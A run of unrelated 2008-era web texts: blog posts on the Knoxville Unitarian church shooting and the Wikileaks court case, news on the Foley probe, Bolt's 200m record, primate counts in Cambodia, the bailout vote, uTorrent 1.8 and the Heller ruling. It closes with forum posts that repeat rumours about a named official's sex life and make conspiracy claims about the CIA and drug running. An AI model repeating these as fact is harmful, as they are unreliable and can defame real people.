I am ashamed to admit that my first , overwhelming emotion was intense anger - not so much at Jim Adkisson , the man who walked into a Unitarian church in Knoxville and opened fire on innocent people , killing two and injuring eight more .
That happens , unfortunately , with all too frequent regularity in America these days , and for a depressingly repetitive litany of reasons - depression , frustration , confused anger and overlooked or ignored mental illness .
The Adkisson killings is not an uncommon event these days .
What is , however , was his target - Unitarians .
Members of a church renown for its pacifism , compassion and tolerance .
We welcome anyone - men and women of any colour and nationality , of any religious or ethnic background , or sexuality .
We even welcome conservatives .
My anger instead is concentrated on those people who callously use such vulnerable people , stirring up their bigotry and discontent , egging them to acts of violence .
People like Michelle Malkin , Michael Savage , Bill O'Reilly , and Rush Limbaugh who have made lucrative careers out of liberal - bashing .
People who write things like " Liberalism is a Mental Health Disorder " , " Let Freedom Ring , " and " The O'Reilly Factor , " - all literature found in Adkisson 's home after the shooting .
People like Ann Coulter who advocated attacking liberals with baseball bats .
The hate - filled spewage from the right - wing media mavens is and should be held accountable for inciting such acts of violence and murder , those heartless , soulless , conscienceless opportunists who have gleefully participated in encouraging the Adkissons of America to take out their anger and hatred and frustration on liberals .
People died .
Good people , decent caring loving people , with friends and families .
They had names : Linda Kraeger and Greg McKendry , a sixty - one year old woman and a foster father who heroically sacrificed his life to save children and his fellow congregation .
They had friends and family and people who loved them and will grieve for their loss .
I make my living writing , words are my stock and trade .
I have no words adequate enough to express my utter contempt and loathing at this moment for every rabid talk show host and every smarmy pundit who ever espoused the killing or injury of another human being because of his or her political beliefs .
If I could , I 'd have every single one of them arrested as accessories to murder .
The blood on their hands is not metaphorical any longer - it 's real .
And they know it , if the bizarre backpedalling of the Malkinesque - ilk is to be believed , so desperate to distance themselves from such actual blood and death that they can shamelessly claim Adkisson is really a liberal trying to discredit conservatives .
Despicable .
The blogosphere is already ripping into that moral sickness that has so pervaded the rightwing that such acts have become not only possible , but excusable - a couple posters on the Free Republic had little sympathy for the dead ; what kind of Christian church , after all , not only accepts gays but would even think of putting on a production of ‘ Annie ' ?
Grounds enough for mass murder , to that warped mindset .
But ... I am a Unitarian .
And in the wake of the anger is pride .
Despite my sadness that people were targeted for their choice of church , I have never before been so proud to be a Unitarian , as well as a liberal .
Those liberals the rightwing continue to denigrate as weak - kneed cowards proved to be anything but .
McKendry was the first to confront Adkisson , to stop him from going any further into the church , before several men rushed Adkisson after several shots had been fired , his victims already covered in blood .
They have names too : A history professor , John Bohstedt , and Jamie Parkey , just ordinary people .
But people who still prove the very best in America still exists .
‘ Someone grabbed the gun and we just kind of dog - piled him to the floor ' , Parkey said .
His wife , Amy , described Adkisson - not as a villain , not as an evil man , not with hatred - but as ‘ a man who was hurt in the world and feeling nothing was going his way .
He turned the gun on people who were mostly likely to treat him lovingly and compassionately and be the ones to help someone in that situation . '
I wept when I read those words .
Because ... I am a Unitarian .
I was born and raised in a faith that teaches tolerance and acceptance and forgiveness .
At the moment , it 's quite difficult for me to live up to the tenets of my faith , but I 've lived my entire life following them , if sometimes imperfectly .
Hate is easy .
Blame and criticism and anger and revenge are easy .
It 's what those talk show hosts and political pundits and politicians on the right have exploited to cultivate their poisonous atmosphere - and I do n't want to be anything like them .
So I will choose the hard way .
I will try to forgive the Adkissons of the world who have been manipulated and conned into violence .
I do n't think I 'm quite ready yet to forgive the Coulters and the O'Reillys and the Malkins and the Limbaughs of this world just yet ... but I will try to work on not hating them quite as much as I know they hate me .
It 's a step .
Maybe tomorrow I can do better .
Today Our Kid forwarded me an email from Cilla Raughley , the UUA 's District Executive , sent out to congregational ministers , religious educators , and board presidents .
In it she pleaded for calm , patience and wisdom .
And asked that Unitarians might want to wear UU T - shirts or jewelry to show their solidarity with those who share our religious values , whether they are Unitarians or not .
She also asked that anyone wishing to send a remembrance card on behalf of Greg McKendry and his widow , Barbara , could do so : Tennessee Valley UU Church , 2931 Kingston Pike , Knoxville , TN 37919-4624 , as well as to the neighbouring Westside Unitarian Fellowship , 616 Fretz Road , Knoxville , TN 37919-1604 , which is where Linda Kraeger would have normally been on a Sunday morning .
And if a reminder was ever needed why I am and will always be a Unitarian , it is that during the candlelight service held in memory of those who died , a few of the children who had been performing in the cast of ‘ Annie ' broke into song .
They sang ‘ Tomorrow ' , in a heart - wrenching reminder that the sun will come out tomorrow .
Just worth pointing out : Henry Paulson ’s decision to let Lehman fail , on Sept. 14 , may have delivered the White House to Obama .
The Wikileaks outrage has just gotten ever more so ridiculous ... and at the same time deliciously ironic .
( Friday evening update : Looks like the judge has reconsidered and Wikileaks.org should be back soon .
...
More detail here .
...
They 're baaaaack . )
If I 'm reading these documents correctly - always a dicey proposition , given that I have a degree in journalism not law - it appears as though the Swiss bank that bamboozled a U.S. judge into pulling the plug on Wikileaks.org has dragged into this morass a human rights activist and Stanford graduate student who has no earthly connection to Wikileaks other than that he vetted some documents the whistleblower haven hosted ( completely unrelated to the bank case ) and also moderated a Facebook discussion group about the site - on Facebook .
The fellow , Daniel Mathews , tried explaining to attorneys for Bank Julius Baer that they were twisting an arm unattached to their target - to no avail - so Mathews actually had to lawyer up , which as Wikileaks notes in a press release " will likely be of keen interest to the very large Facebook community . " ...
Or anyone who contributes to any wiki or discussion board about any controversial topic .
From the Wikileaks release :
The following excerpt demonstrates the type of abuse of process used by Bank Julius Baer & Trust 's ( law firm ) Lavely & Singer to bring about a hearing at which Wikileaks was not represented : Plaintiff 's counsel responded : " Wikileaks lists you as an officer of the company on its Facebook page .
As an officer of a defendant in this action , my client is entitled to serve you a copy of the summons and complaint pursuant to Rule 4 ( h ) ( 1 ) ( B ) of the Federal Rules of Civil Procedure . "
Facebook is a website created for college students ( and now used by others ) as a social networking site .
The Wikileaks website had invited people to start discussion groups on Facebook and other websites .
The Facebook page at issue had identified ( Mathews ) as the " Stanford rep. " of the discussion group , and the Facebook term " officer " has no significance ; the fact that I am an " admim " merely indicates that I was a moderator of that discussion group .
I responded to Plaintiff 's counsel : " I am an officer of a Facebook group , which is essentially a message board for discussion of issues relating to Wikileaks .
I am not , and never have been , an officer of Wikileaks , and I request you not to represent that I am . "
Nevertheless , on February 22 , 2008 , Plaintiffs counsel declared to this Court that " Plaintiffs served a copy of the TRO and OSC on the Wikileaks Defendants via e-mail , per the Court 's prior order , to the personal e-mail address for a listed officer of Wikileaks . "
In other words , tough cookies , Mr. Mathews , you 're the best we 've got for a Wikileaks officer at the moment , so you 're our man and here 's your subpoena .
That 's the ridiculous part .
Now for the delicious irony .
Mathews and his attorney , Joshua Kolten , have decided to make lemonade out of lemons :
Since the bank insists Mathews has standing in the case , Mathews is asking the judge to consider the harm that the court 's earlier injunction against Wikileaks has done to him ; namely that it has prevented readers from accessing on Wikileaks the material he has written about subjects completely unrelated to the bank and its business .
Hopefully the judge will appreciate the point , get Wikileaks back online ... and let Mathews get back to Stanford and Facebook .
( Update : Looks like Noam Chomsky could be next in line for a legal love note from the bank .
( CNN ) -- The Florida Department of Law Enforcement will close a criminal investigation into former U.S. Rep. Mark Foley on Friday without filing charges , two law enforcement sources said Thursday .
Authorities were investigating whether Foley might have used computers in Florida to engage or solicit minors in any illegal activities .
The Republican , who represented Florida 's 16th District in Congress , resigned in September 2006 after suggestive e-mails and instant messages he had written to teenage House pages surfaced in the media .
Florida agency spokeswoman Heather Smith said last month that investigators hoped to finish their work within two weeks and that results of the investigation would be turned over to State Attorney Bill Eddins in Pensacola , Florida , where Foley was at the time he is said to have communicated with a young man .
But the agency said the House of Representatives had blocked efforts to review files on computers Foley used in his congressional office .
Smith said the agency was working with the FBI and Foley 's lawyers to review the contents of those computers , which are federally owned .
Foley 's attorneys had denied that he ever engaged in sexual activity with minors .
" I have no comment , " Foley 's attorney David Roth said Thursday when asked about the reported closure of the Florida investigation .
" I can not confirm or deny your report . "
A federal investigation of Foley has been closed for some time , according to sources .
Foley entered a treatment facility for alcoholism shortly after he resigned and revealed that he is gay and was molested by a priest when he was between the ages of 13 and 15 .
A House Ethics Committee investigation of the scandal concluded in December 2006 that House GOP leaders were negligent in not protecting male teenage pages from possible improper advances by Foley .
But the panel said there were no violations of the House Code of Official Conduct and decided that no one would be reprimanded .
A Justice Department report issued a month later said the FBI should have notified the House or other officials when members first learned of inappropriate e-mails .
The FBI acted within its " range of discretion " when it initially decided not to open a criminal investigation in the case , the Justice Department said .
But the internal watchdog 's investigation concluded that simply filing away the complaint from a public interest group was an inadequate response .
CNN 's Susan Candiotti and Kevin Bohn contributed to this report .

What 's missing from that list ?
Loads of Sierra titles .
Ghostbusters : The Video Game and Brütal Legend to name two .
WET and Chronicles of Riddick : Assault on Dark Athena to name two more .
Want another ?
50 Cent : Blood on the Sand .
Yes , " Uh oh " might be the words you 're looking for .
" We have conducted a thorough review of Vivendi Games ' brand portfolio and are retaining those franchises and titles that are a strong fit with our long - term product strategy , " Mike Griffith , CEO of Activision Publishing , said in a corporate statement .
" We are reviewing our options regarding those titles that we will not be publishing . "

Word from sources that Federal District Judge John Bates has denied the White House the stay it sought in the House Judiciary Committee 's suit to enforce its contempt of Congress citations against Harriet Miers and Joshua Bolten .
Bates ' opinion , while ostensibly dealing with the Miers and Bolten cases , was clearly written with the Karl Rove contempt freshly in mind as well .
Without the stay in place , Miers and Bolten are under court order to appear before the House Judiciary Committee for questioning in connection with the dismissals of the U.S. Attorneys .
No such order is currently in place for Rove , but Bates was clear in his reasoning that Rove would have even less grounds for any refusal to appear than Miers and Bolten ever did , since the White House has never actually asserted any executive privilege claims with respect to Rove 's testimony .
Miers and Bolten , though , would technically still be in compliance with the order if they agreed to appear , but asserted the same claims of executive privilege in person that they did in letters from their attorneys before .
Rove , if he continues to refuse to appear , would undoubtedly find himself subject to a court order to appear .
But he 's not under one now .
Living in Republican Crazytown as we do , we still have to ask the question , " What if ? "
What if Rove refuses to take the hint ?
Or for that matter , what if he refuses to appear , has a court order entered against him , and refuses anyway ?
Or if Miers and / or Bolten do the same ?
Then we face the question that has always been at the bottom of this issue : can Article III force Article II to appear before Article I ?
Or more specifically , can Article III order Article II to arrest itself and bring it before Article I ?
What will Bates do if his order is defied ?
And how much patience will he have with continued gamesmanship -- e.g. , an appearance before the committee that nonetheless produces questionable claims of executive privilege , or the entirely ridiculous " absolute immunity " claims
Rove has made ?
Given that Bates was clearly factoring in the time limitations of Congressional subpoenas in his earlier opinion , he 'll have to come down on Miers / Bolten / Rove like a ton of bricks if he wants to stay true to his ruling .
We 'll see .
Ah , how easily phrases can be misconstrued when you 're not absolutely precise in what you say .
While the intarwebz have been ablaze with speculation about the elusive " new peripheral " on the forthcoming Guitar Hero : World Tour title , Neversoft project director Brian Bright has delivered a copious amount of non-potable water to the scene in the form of this sobering news .
There actually wo n't be any new " instrument , " per se ; rather , the PS3 version of the game will include a MIDI import feature that gives PC - using musicians the ability to import rhythm guitar , lead guitar , bass , keyboards and drum tracks in as a GH Tunes song .
For undisclosed " hardware reasons , " the Xbox 360 version can only handle the skins .

Vividly indeed do I remember the lovely and sordid tale my friend once told me , many years ago , of the terrific guy she once dated , a strapping young thing who - through a series of unfortunate childhood events - had to have a remote - controlled , robotic penis installed in his body .
Let me be more specific .
Apparently , this fine lad 's delicate man tissues had been damaged in a very unpleasant bicycle accident in his youth , and he could therefore no longer enjoy normal erections .
Everything else functioned just fine , but when it came to sex , despite having full sensation , all systems were mangled , all blood vessels shot .
Sad indeed .
But then , a savior .
Through the miracle of modern medicine and not - so - modern pneumatics , ingenious doctors were able to install some sort of marvelous contraption , a valve and a rod and bladder and a little pump - a complete mechanical system by which our boy could , well , inflate and deflate his manhood at will , last as long as he liked , repeat as frequently as energy and soreness and lubricant allowed , and thereby enjoy a ( relatively ) normal sex life .
It worked like a charm .
It also worked like an aphrodisiac , a mesmerizing technological miracle , and a pair of old Reebok Pump basketball shoes .
What you did was : Squeeze a little bulb at the base of the perineum a few dozen times to inflate , to raise the flag and see who salutes .
Enjoy indefinitely (!)
When finished , simply reach up underneath into God 's country and press a different little bulb to deflate the air bladder and , well , lower the mainsail ( my friend said this particular procedure sounded like a sad squeaky toy , sighing slowly .
She found it adorable ) .
( Here is where I 'd like to tell you my friend 's nickname for this lad , but they tell me this is still a family website and baffled children / grandmothers could be reading this and are already panicky that they saw the word " penis " on screen .
So I 'll just say it rhymed very closely with " The Wonder Sock . " )
This heartwarming tale comes to mind as I read of how scientists have now developed a tiny valve they can surgically implant into the manhood of mankind to , well , control the flow of sperm at will .
Your own built - in , reversible , radio - controlled vasectomy !
they exclaim , with a winking Australian grin .
Apparently , said contraption involves a little remote - controlled switch that can , at the press of a button , activate or deactivate the flow from wherever it is that sperm flows ( a musty little furniture shop somewhere on the outskirts of London , I think ) by opening and closing a valve installed into the all - important duct known as the vas deferens .
Nifty !
I know what you 're thinking .
A remote - controlled sperm valve ?
Are you crazy ?
Who the hell would want something like that ?
I 'll tell you who : Every modern male under 30 , that 's who .
Hell , add in a digital camera and an MP3 player and maybe built - in GPS , and you 've got the next iPod .
See , like my friend 's wonder sock , I think such technology would play directly upon the dual modern male fantasies of unlimited penile dexterity and übergeek tech coolness .
In the age of gizmo wonders and technologically advanced everything , why not a mechanically enhanced penis ?
Why not a little Iron Man in your iron man ?
Make it easy , make it relatively affordable , market it like you would the Bang & Olufsen stereo option on an Audi R8 ( i.e. , an invaluable enhancement , not a threat ) , and I say : Viva la revolucion !
It is , of course , all part of the eternal quest for an easy , idiot - proof male birth - control device for consensual adults that does n't involve sheathing everything in miserable amounts of latex and therefore dulling the finest sensation known to all malehood next to perhaps a superlative foot massage and maybe sipping dark rum in a hot tub with nubile pagan fire priestesses from the moon .
But maybe such a valve wo n't be necessary .
After all , they say there 's already been a big breakthrough in male birth control , that scientists have finally developed a surefire " male pill " that knocks any man 's sperm count down to zero , and all that 's left is a bit of clinical testing .
So effective is the new pill that it 's apparently safer than condoms , safer than the female pill , safer than staring at a photo of Ann Coulter for three full , agonizing minutes while your sperm commit mass suicide from sheer horror .
Amazing .
But apparently there 's a problem .
Big Pharma does n't seem to care about this new breakthrough .
And why ?
Money , of course .
They say there 's just not enough interest .
Men do n't seem to be clamoring for it , the market does n't seem to be there , millions do n't stand to be made , and hence no one wants to fund more research on the thing , which could result in a wait of three to five more years before such a pill hits the market , if it ever does .
What 's more , some argue that dumb - as - nails men are too unreliable for such a thing anyway , that no woman worth her weight in diaphragms and Nonoxyl - 9 would dare trust a man to remember to take a pill every day , because of course men are generally irresponsible schlubs who can't even remember their own phone numbers and etc. and so on and cliché cliché cliché .
To which I say , utter and total B.S.
There 's not a smart modern male I know who would n't love to know he would n't - could n't - get a date pregnant , that there could be no " accidents , " that he will never get that life - altering phone call .
Hell , there 's already a trend whereby some baby - terrified men are getting old - school surgical vasectomies in their early 20s , rife with the fear that some nefarious huntress might try to snare them in the baby trap .
Shift the power dynamics of fertility and birth control to men ?
Talk about your massive cultural psycho-sexual upheavals .
Watch for it .
But maybe that 's neither here nor there .
Maybe the pill 's researchers need to hook up with the valve engineers and the genius docs who installed my friend 's lover 's old penis pump way back when , and all work together to solve this most pressing issue and move humanity , uh , forward .
Which is to say , you want to guarantee men engage fully in matters fertile and impregnable ?
You want to make sure they care deeply about familial responsibility and planning ?
Do n't just give them a pill .
Give them a slick badass high - tech gizmo to deliver it , maybe a hot little button on their iPhones that not only shuts a microvalve and releases the pill 's chemicals , but also boosts stamina , responds to voice commands , calculates the tip on the dinner bill , organizes their playlist according to a given date 's particular mood , and of course , reminds them exactly where the clitoris is .
Really , what more do you need ?

BEIJING --
Arms churning high , face twisted in pain as he
sprinted toward the finish line , Usain Bolt kept glancing at the
clock .
The win in the Olympic 200 meters was a given , his second gold
medal of the Beijing Games assured .
This was now about a world record .
About racing against history .
Showing just what he can do when he goes all out start to
finish , Bolt forged the greatest race ever run Wednesday night
under the hazy lights at the Bird's Nest , heaving his chest toward
the finish line -- not simply to beat someone for the gold , but to
become a part of track 's glorious , and sometimes troubled , lore .
He finished in 19.30 seconds to break Michael Johnson's
12 - year - old world record , one of the most venerable in the books .
" I just blew my mind and blew the world 's mind , " Bolt said .
Insane , Usain .
Officially , he won by an astounding 0.66 second over American
Shawn Crawford , the defending Olympic champion .
Crawford won the
silver medal when Churandy Martina of Netherlands Antilles , who had
finished 0.52 behind Bolt , was disqualified after a U.S. protest
for running out of his lane .
" It feels like a charity case , "
Crawford said .
Either way , it was about four body lengths , the biggest margin
in an Olympic 200 .
American Walter Dix was awarded the bronze medal when the third
man across the line , teammate Wallace Spearmon , also was DQ'd for
leaving his lane .
Footnotes to history .
Bolt added the 19.30 -- 0.02 better than Johnson 's old mark -- to
the 9.69 he ran the 100 four nights before when he hot - dogged the
final 20 meters to set the world record .
Everyone thought he could 've done better in the 100 had he run
hard the whole way , but the 200 has always been Bolt 's favorite ,
the one he spent his life on , and this time he saved the
showboating for after the race .
" I 've been dreaming of this since I was yea high , " Bolt said .
" So it means a lot more to me actually than the 100 means . "
After the unrelenting effort with a slight headwind in his face ,
Bolt sprawled out on the ground , arms and legs outstretched ,
basking in the roar of the Bird's Nest crowd and the glow of
becoming , quite possibly , the greatest sprinter ever .
Bolt 's name now goes above , or at least beside , every great
sprinter to ever put on spikes .
Usain Bolt ran Wednesday 's 200 meter final in 19.30 seconds , breaking Michael Johnson 's 12 - year - old record of 19.32 .
AP Photo / David Phillip
He became the first man to win the 100 - 200 double at the
Olympics since Carl Lewis in 1984 .
He gets mentioned in the same breath with Johnson , as well as
Jesse Owens and any of the other six men to complete the Olympic
100 -200 double .
Nobody other than Johnson had ever run a 200 in
under 19.6 and nobody had broken 9.7 in the 100 before Beijing .
Bolt has done both , the only man ever to break the world record
in both sprints in the same Olympics .
Bolt is simply a different kind of runner -- coiled power in his
6 - foot - 5 frame , supposedly too big for success in the 100 , but
certainly built to run the 200 .
" It 's his anatomy , " said Renaldo Nehemiah , the former world
record - holder in the 110 - meter hurdles .
" He 's just blessed with an
uncanny frame , an uncanny quickness , a huge competitive heart .
And
he is having a good time , which I think our sport sorely needs to
see . "
Indeed , track and field could use a breath of fresh air after
years of bad news , bad characters and failed drug tests that have
come close to turning the sport into second - tier Olympic viewing .
There are cynics who believe Bolt might be too good to be true
himself .
But the Jamaican insists he is clean , that he plays by the
rules , that any improvement he 's enjoyed over the last few months
has come courtesy of rededicating himself to his training and
staying off the dance floor he loves so much .
Today at Maker Faire 2008 , MacGyver creator ( and real life inspiration ) Lee David Zlotoff announced he has a big budget MacGyver movie in the planning stages .

Zlotoff mentioned he somehow ended up with the movie rights years ago ( extremely uncommon ) , giving him full control over the film .
While few specifics were mentioned , and no formal announcement has been made , its extremely promising that the man with the power to make the film is getting the ball rolling .
The question is ... do you bring back Richard Dean Anderson as old MacGyver , or bring in a younger , Christian Bale - type to reprise the role of makeshift gadget god ?

UPDATE : We asked Zlotoff if a Swiss Army Knife is still good enough for MacGyver today , check out his answer here .

A Wildlife Conservation Society report reveals surprisingly large populations of two globally threatened primates in a protected area in Cambodia .
The report counted 42,000 black - shanked douc langurs along with 2,500 yellow - cheeked crested gibbons in Cambodia 's Seima Biodiversity Conservation Area , an estimate that represents the largest known populations for both species in the world .
WCS scientists conducted the surveys with the Royal Government of Cambodia 's Ministry of Agriculture , Forestry and Fisheries across an area of 300 square miles ( 789 square kilometers ) within a wider landscape of 1,150 square miles ( 3,000 square kilometers ) , which is about the size of Yosemite National Park .
The scientists believe total populations within the wider landscape may be considerably greater .
The WCS scientists who worked on the census include Tom Clements , Nut Meng Hor , Men Soriyun , Edward Pollard , Hannah O'Kelly , and Samantha Strindberg .
The data were first presented at the International Primatological Society Congress held recently in Edinburgh , Scotland .
WCS also announced at the IPS Congress the discovery of 125,000 western lowland gorillas in northern Republic of Congo , where conservation work has been ongoing since the early 1990s .
" Whether it 's protecting gorillas in the Republic of Congo or monkeys and gibbons in Cambodia , conservation can and does work when you have government commitment and scientific knowledge on the ground , " said Dr. John G. Robinson , Executive Vice President for Conservation and Science for the Wildlife Conservation Society .
" Now we must put into place the management to truly protect these populations and apply the approach to other regions where primates are in trouble . "
The two primate species are found in much lower numbers at other sites in Cambodia and in Vietnam .
Prior to the recent discovery in the Seima Biodiversity Conservation Area , the largest known populations were believed to be in adjacent Vietnam , where black - shanked douc langurs and yellow - cheeked crested gibbons hover at 600 and 200 respectively .
The total population of the two species remains unknown .

The recent census in Cambodia took place in a former logging area where the two monkeys were once extensively hunted .
Then in 2002 , the Minister of Agriculture , Forestry and Fisheries declared the region a conservation area and began working with WCS on site management and landscape - level planning for conservation and local development .
According to WCS , a combination of factors account for such high numbers of primates : successful long - term management of the conservation area ; cessation of logging activities ; a nation - wide gun confiscation program implemented in the 1990s ; and habitat where there is plenty of food .
The report says that the two primate populations started to recover in 2002 when the joint program between WCS and the Royal Government began and have remained stable since 2005 .
The news on primates is not all good .
In Cambodia , WCS researchers are concerned that looming threats could jeopardize recent successes .
" Despite this good news in Cambodia , the area still remains at risk from conversion to agro- industrial plantations for crops , including biofuels , and commercial mining , " said Tom Clements , the lead author of the WCS report .
" WCS is therefore committed to continuing to work with the Cambodian Government to ensure that these globally important primate populations will continue to remain secure . "
WCS has worked with the Royal Government of Cambodia since 1999 , helping to establish the Seima Biodiversity Conservation Area , and developing landscape - level conservation programs in the Northern Plains and Tonle Sap Great Lake .
WCS work in Cambodia has been supported by U.S. Fish and Wildlife Service 's Great Apes Conservation Fund , MacArthur Foundation , Liz Claiborne Art Ortenberg Foundation , ADB Greater Mekong Subregion Core Environment Program , and the Danish Government 's Danida program .
Why the Bailout Bill Failed
So how could a major bill described by the president and both parties ' leaders as critical to the well - being of the nation 's -- and the world 's -- economy go down to defeat ?
There are no easy answers here , as the House 's stunning defeat moments ago of the financial bailout legislation is putting us into seemingly uncharted territory .
But while the final tally , with 133 Republicans and 95 Democrats voting no , was a surprise -- all morning , Hill sources were predicting narrow passage -- the signs were there that the measure was in trouble :
1 ) Poor Salesmanship .
Did you know that the general consensus is now that this bill will not cost $ 700 billion ?
If you did n't , it 's because the bill 's proponents did a poor marketing job .
From the start , the Bush administration did not do enough to emphasize the point that taxpayers would get at least some of the money back , and that gigantic price tag got stuck in the head of the public ( and the media ) .
The administration was also too eager and ambitious with its initial proposal , alienating many lawmakers right from the start by seeming to ask for the moon -- give us everything we want , with no oversight .
This White House has long played political hardball , but this was not the time for hardball .
This was the time for begging .
The administration also let the " bailout " label stick to the package right from the start .
By the time President Bush started calling it a " rescue " measure , it was too late .
2 ) Vulnerables Scared .
If you have a difficult reelection race , what was your motivation to vote for this bill ?
" I voted in favor of a bill that I did n't really like , because I had no choice , " does n't make for a particularly snappy campaign slogan .
" I stood up to my party and Wall Street , " sounds much better .
House Majority Leader Steny Hoyer ( D - Md. ) and Minority Leader John Boehner ( R - Ohio ) both made the argument that lawmakers needed to rise to the occasion and not think of their own political futures .
But members of Congress ALWAYS think of their political futures .
It 's much easier to talk of sacrifice for the greater good when you 're going to get reelected with 70 percent of the vote , like nearly every leader on both sides of the aisle will .
3 ) No Center of Gravity .
Who 's running Washington right now ?
Bush is the lamest of lame ducks , with a minuscule approval rating and no clout or political protection left to offer .
Bush and Vice President Cheney were reportedly making calls to wavering Republicans right to the end ; obviously that did n't do the trick .
Barack Obama and John McCain both supposedly support the bill , but neither of them has been exactly wholehearted in their backing , and there have n't been any reports of either candidate calling members of their own party to lobby .
House leaders , meanwhile , did support the bill and did whip it .
But this was n't a party - loyalty vote ; lawmakers were asked to vote yes , but they were n't threatened .
They ( probably ) were n't bribed .
Add all that up , and you had a power vacuum .
4 ) Ideological Problems .
The simplest explanation of all for the loss was that a lot of members just did n't like the bill .
Capitol Briefing outlined last week all the reasons why House conservatives balked at the initial proposal , and the basic point still stands :
A massive expenditure of taxpayer funds and intervention in the free market , combined with tough new regulations , simply offended too many conservatives ' most basic principles .
And Republicans , being in the minority , feel no responsibility to govern .
They calculated that the bill 's failure will be blamed on Bush ( so what ? ) and the majority Democrats .
On the liberal end of the spectrum , most members believe this really does represent a " bailout " of Wall Street and a power grab by the Bush administration , and that the current crisis vindicates their longtime warnings that the financial system was riven by greed and insufficient regulation .
For those members , the final package did n't have nearly enough help for struggling homeowners .
5 ) Partisanship ?
House Republican leaders gave a press conference right after the vote , and they have strongly suggested that Speaker Nancy Pelosi's ( D - Calif . ) floor speech toward the end of the debate was at least partly to blame for the loss .
" I do believe we would have gotten there had the Speaker not made this partisan speech on the floor of the house , " Boehner said .
It 's too early to know whether Pelosi 's speech , which laid much of the blame for the whole financial crisis at the foot of the Bush administration , really made much of a difference .
But if several House Republicans actually did switch their votes on a momentous piece of legislation just because they were irritated by a speech , what does that say about them ?
As Rep. Barney Frank ( D - Mass . ) mockingly characterized the GOP 's argument : " Somebody hurt my feelings , so I 'm going to punish the country . "
It 's possible despite weeks of warnings , and a stock market that is cratering as we speak , that a lot of members still are n't taking any of this seriously enough .
And that , ultimately , may be the real reason for today 's vote .
After months of hard work and more than six months since their previous stable release , the uTorrent team has released version 1.8 of their BitTorrent client , with significant improvements and updates .
Adding to the excitement , we were told that a public Alpha of the Mac version will be released in the next few weeks .
uTorrent is the preferred client among many BitTorrent users .
In December we reported that the number of uTorrent users worldwide had more than doubled in a year .
At the time , 5.1 % of all Windows PCs had the BitTorrent client installed , and this number has probably been growing further since then .
Users have had to wait a while for this new release , since the last stable uTorrent , version 1.7.7 , was released back in January .
A lot of work has been done in the meantime though , and the list of changes and additions that were implemented is “ absolutely massive ” , to quote Firon .
One of the most significant updates in the latest version of uTorrent is that it comes with built in IP v6 support , which improves connectivity and thus performance .
Other new features are better Windows Firewall registration on Vista and improved distribution of new connections across torrents .
The journey from 1.7.7 has been a long one , but now that 1.8 stable is out , the uTorrent team will dedicate more time developing the long awaited Mac version of the client .
uTorrent developer Greg Hazel told TorrentFreak that they will be “ more heavily focused ” on the Mac version now , which they have worked on for more than a year already .
The good news for Mac users is that Greg hinted that the first public Alpha version will be released in just a few weeks .
uTorrent was initially developed by Ludvig Strigeus , and the first public version of the application was released in September 2005 .
A year later , in December 2006 , uTorrent was acquired by BitTorrent Inc. , but it will remain separated from other projects that the company is involved in .
As Ashwin Navin , President and Co-founder of BitTorrent Inc. told us last year : “ utorrent.com and uTorrent community will exist indefinitely .
It ’s vibrant and growing , and we value the feedback provided in the forums a lot . ”
u Torrent 1.8 can be downloaded from the uTorrent website , and the list of changes , improvements and additions is available in the forum thread announcing the release .
On June 26 , 2008 , the Supreme Court of the United States handed down a landmark decision in District of Columbia v. Heller .
This case represents the first time the Court has considered in detail the nature and scope of the Second Amendment .
At issue were the District of Columbia ’s laws which largely ban all handgun possession within the city and which require all long arms to be unloaded and either disassembled or fitted with a trigger lock , rendering them essentially unavailable for self defense as “ functional firearms . ”
The Court , in a 5 - 4 decision which struck down both the outright handgun ban and the “ functional firearms ” ban , held that the Second Amendment guarantees a strong individual right to keep and bear arms , which includes the right to have arms for self defense in the home .
There should be no doubt in anyone ’s mind that this is an excellent result which gun owners should be very pleased with .
The decision clearly and unambiguously establishes the strong and fundamental nature of the individual right to keep and bear arms .
Significantly , however , the Court noted that the right to keep and bear arms is not without limitations , just as the right to free speech is not unlimited .
The Court stated that its decision should not be read to cast doubt on such laws as long standing prohibitions on the possession of firearms by felons or the mentally ill , or in such sensitive places as schools or government buildings and the like .
Thus , the Court clearly signaled that there are a variety of gun laws which are permissible under the Second Amendment .
This has two significant implications for the future .
First , it will take many future lawsuits to establish precisely what sort of laws are and are not permissible under the Second Amendment .
Both sides will likely find themselves fighting that battle vigorously .
Second , those laws that are , in fact , permitted under the Second Amendment will form the fertile ground upon which future political activity will rest .
It will remain the province of law abiding gun owners to oppose , politically , gun laws which , though constitutional , are nevertheless unwise and harmful to liberty and safety .

I have heard two rumors regarding Troy King 's gay lover .
The first is that Troy King employs his lover in the State AG 's office .
The second rumor is that Troy King 's gay lover is just a college student at Troy State university .
If Troy King is employing his gay lover in the State AG 's office , that is grounds for removal .
Can someone clear this up , please ?

I have been in five jails , harassed by police for nearly ten years , crossing state lines in the South , since my son 's disappearance from Georgia to Alabama .
Not only have I suffered false arrests and harassment , but ridicule and manipulation of medical / financial / records and terror in my back yard with slaughter of my animals .

My motto : " Staying Alive " My Dad dropped dead of a heart attack at the age of 39 , active duty last day of the Cuban Missile Crisis ( 10/28/62 . )
He was a pilot , USN , ready to fly and had passed the Navy 's physical requirements .
1966 , an uncle , USN relocated to Fairfax , Va. , and died the same way , age , 39 .
1971 saw his best USN friend die with a heart attack , as well .
1981 , another uncle , USN , took a job offer in Boca Raton , and died in an accidental boiler explosion .
Just before he died my Dad had also bought into Dahlberg 's ( Watergate ) hearing aid business venture .
I am a former church secretary and a political cartoonist ( http://whackedpolitics.googlepages.com) whose military family and ancestors would turn over in their graves to know the corruption , and to know what is being done in this country to genocide what 's left of their descendants .
I was recently in Florida to see a beach lined with empty condominiums sitting anxiously for the slot machines surely planned for the massive lobbies .
I was advised the buildings were built illegally directly on the beach .
It 's very important to note former Governor Don Siegelman had a battle , lottery vs. casino , when all " scientific gaming " involves organized crime in one way or another .
Few people realize the power of Abramoff 's casino friends , Las Vegas , and the " CIA " ( Casino Industry in America . )
There were casinos in Cuba and RFK had vowed to eradicate the mafia from this country .
As it is , fifty years have proven military intelligence has placed former officers in high ranking position , enriched them with private industry and with government contracts , and done little to nothing to eradicate organized criminals , or illegal drugs .
It has been written the cocaine kingpins in this country actually have a sick , secretive religion .
Their drug profits are well protected while Americans struggle to pay taxes to clean up the messes made by their illegal endeavors , in jails , prisons , and medical expenses .
I 'm sure if my Dad had been asked to use his Navy pilot 's talents to run ( CIA - Cocaine Importing Agency ) drugs he would have declined .
But there were military retirees in our state ( Virginia ) who gained incredible wealth from the bloodbaths and devastation of illegal drug distribution , and walked around smiling about it , their thoroughbred race horses , fox hunts , and bragging about their affluent friends and associates at the court houses .
